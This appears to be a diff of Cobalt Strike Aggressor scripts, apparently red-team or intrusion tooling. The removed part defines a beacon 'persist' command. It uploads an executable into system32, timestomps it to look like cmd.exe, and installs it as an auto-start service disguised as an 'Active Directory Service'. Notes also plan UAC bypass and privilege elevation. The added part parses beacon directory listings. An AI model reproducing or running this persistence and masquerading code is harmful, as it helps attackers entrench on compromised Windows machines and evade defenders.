@@ -1,32 +1,14 @@
-# testing agressor scripts for cobaltstrike
+#### random chunks of code to test things ####
 
-alias("foo", {
-        bshell($1, "dir c:\\windows\\temp");
-});
-
-alias("bar", {
-        bgetuid($1);
-});
-
-alias ("persist", {
-    if (-exists script_resource("adsvc.exe")) {
-        binput($1, "service persistence (server) [AD]");
-        bcd($1, 'c:\windows\system32');
-        bupload($1, script_resource("adsvc.exe"));
-        btimestomp($1, "adsvc.exe", "cmd.exe");
-        bshell($1, 'sc delete adsvc');
-        bshell($1, 'sc create adsvc binPath= "C:\windows\system32\adsvc.exe" start= auto DisplayName= "Active Directory Service"');
-        bshell($1, 'sc description adsvc "Provides authentication and policy management for computers joined to domain."');
-        bshell($1, 'sc start adsvc');
-
-    }
-    else {
-        berror($1, "adsvc.exe does not exist :(");
-    }
-});
-
-### Things to do ###
-### if $random is in c:\windows\temp then persistence has ran
-### if user is admin/system, run peristence
-### if user is user, run bypassuac
-### if user is user and bypassuac failed, run elevate
+### if you run an ls on a directory, and first.log is there this will output to the script console
+on beacon_output_ls {
+        if ("*first.log*" iswm $2) {
+                local('$temp $type $size $moddate $modtime $name');
+                foreach $temp (split("\n", $2)) {
+                        if ("*first.log*" iswm $temp) {
+                                ($type, $size, $moddate, $modtime, $name) = split("\\s+", $temp);
+                                println($name);
+                        }
+                }
+        }
+}
